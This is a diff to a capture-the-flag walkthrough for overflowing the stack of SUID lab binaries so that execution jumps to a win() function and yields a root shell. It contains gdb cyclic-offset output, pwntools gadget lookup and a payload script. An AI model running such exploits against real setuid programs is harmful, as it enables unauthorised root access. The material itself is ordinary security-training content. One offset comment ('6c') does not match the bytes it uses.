@@ -32,37 +32,58 @@ Goal: Exploit the SUID binary `/home/p1/p2/p2` to get a root shell and extract t
 ### Steps (x86_64)
 1. Find the `win()` address:
 ```bash
-nm -n /home/p1/p2/p2 | rg " win$"
+nm -n /home/p1/p2/p2 | grep " win$"
 ```
 2. Find the offset to RIP (use a cyclic pattern):
 ```bash
 python3 - <<'PY' > /tmp/p2_pat
 from pwn import cyclic
-print(cyclic(400).decode())
+print(cyclic(400, n=8).decode())
 PY
 
 gdb -q /home/p1/p2/p2
 (gdb) run < /tmp/p2_pat
 (gdb) info registers rip
+(gdb) x/4gx $rsp
+0x7ffd4f3719b8: 0x616161616161616a      0x616161616161616b
+0x7ffd4f3719c8: 0x616161616161616c      0x616161616161616d
 ```
 3. Compute the offset:
 ```bash
+# 61 61 61 61 61 61 61 6c
+# jaaaaaaa
+
 python3 - <<'PY'
 from pwn import cyclic_find
-print(cyclic_find(0x6161616b))  # replace with RIP bytes
+pc_bytes = b"jaaaaaaa"
+print(cyclic_find(pc_bytes, n=8))
 PY
 ```
 4. Build payload and get root:
 ```bash
-python3 - <<'PY' | /home/p1/p2/p2
-from pwn import p64
-offset = 72  # replace with your result
-win = 0x400704  # replace with nm output
-print(b"A"*offset + p64(win))
+python3 - <<'PY'
+from pwn import *
+elf = ELF('/home/p1/p2/p2')
+rop = ROP(elf)
+print("win =", hex(elf.symbols['win']))
+print("ret =", hex(rop.find_gadget(['ret']).address))
 PY
+
+python3 - <<'PY' > /tmp/p2_payload
+import sys
+from pwn import p64
+offset = 72
+ret = 0x40101a      # replace with your gadget
+win = 0x4011b6      # from nm / pwntools
+sys.stdout.buffer.write(b"A"*offset + p64(ret) + p64(win) + b"\n")
+PY
+
+cat /tmp/p2_payload - | /home/p1/p2/p2
+
 ```
 5. Extract:
 ```bash
+id
 ctf-extract P2
 ```
 
@@ -76,7 +97,7 @@ Goal: Hijack control flow of `/home/p1/p3/p3` to reach `win()` and reveal the fl
 ### Steps (x86_64)
 1. Find `win()`:
 ```bash
-nm -n /home/p1/p3/p3 | rg " win$"
+nm -n /home/p1/p3/p3 | grep " win$"
 ```
 2. Find offset with cyclic pattern (same method as P2).
 3. Build payload:
